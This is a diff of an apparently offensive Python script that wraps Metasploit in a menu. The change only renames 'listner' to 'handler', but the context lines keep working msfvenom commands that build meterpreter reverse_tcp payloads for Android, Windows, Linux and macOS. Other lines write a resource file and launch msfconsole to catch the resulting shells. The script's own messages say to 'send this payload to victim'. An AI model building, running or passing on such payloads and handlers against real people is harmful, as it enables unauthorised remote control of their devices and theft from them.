@@ -23,7 +23,7 @@ try:
 >>> Main menu"""+Y+"""
 
 1) Create a payload
-2) Start listner
+2) Start handler
 3) Launch Metasploit
 4) Exit\n""")
 
@@ -43,7 +43,7 @@ Select option to create payload\n"""+CY+"""
         print(R+"""
 ************************************************"""+Y+"""
 
-Select option to create listner\n"""+CY+"""
+Select option to create handler\n"""+CY+"""
 1) Android
 2) Windows
 3) Linux
@@ -87,7 +87,7 @@ Select option to create listner\n"""+CY+"""
                     st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.apk"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.apk'+G+" in 'payload' folder"+R+" <<<\n")
-                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
+                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==2:
@@ -97,7 +97,7 @@ Select option to create listner\n"""+CY+"""
                     st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.exe"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.exe'+G+" in 'payload' folder"+R+" <<<\n")
-                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
+                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==3:
@@ -107,7 +107,7 @@ Select option to create listner\n"""+CY+"""
                     st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.elf"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.elf'+G+" in 'payload' folder"+R+" <<<\n")
-                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
+                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==4:
@@ -117,7 +117,7 @@ Select option to create listner\n"""+CY+"""
                     st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.macho"
                     os.system(st)
                     print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.macho'+G+" in 'payload' folder"+R+" <<<\n")
-                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
+                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                     osi()
                     sel1()
                 elif ch==99:
@@ -130,7 +130,7 @@ Select option to create listner\n"""+CY+"""
             osi()
             sel1()
         elif c==2:
-            # Creating listner
+            # Creating handler
             def sel2():
                 ch=int(input(G+"Select your choice >>"+W+" "))
                 if ch==1:
@@ -153,7 +153,7 @@ Select option to create listner\n"""+CY+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"\nStarting listner...............\n"+W)
+                    print(Y+"\nStarting handler...............\n"+W)
                     os.system("msfconsole -r msh.rc")
                     os.remove('msh.rc')
                     os.system("clear")                      
@@ -179,7 +179,7 @@ Select option to create listner\n"""+CY+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"\nStarting listner...............\n"+W)
+                    print(Y+"\nStarting handler...............\n"+W)
                     os.system("msfconsole -r msh.rc")
                     os.remove('msh.rc')
                     os.system('clear')
@@ -205,7 +205,7 @@ Select option to create listner\n"""+CY+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"\nStarting listner...............\n"+W)
+                    print(Y+"\nStarting handler...............\n"+W)
                     os.system("msfconsole -r msh.rc")
                     os.remove('msh.rc')
                     os.system('clear')
@@ -231,7 +231,7 @@ Select option to create listner\n"""+CY+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"\nStarting listner...............\n"+W)
+                    print(Y+"\nStarting handler...............\n"+W)
                     os.system("msfconsole -r msh.rc")
                     os.remove('msh.rc')
                     os.system('clear')
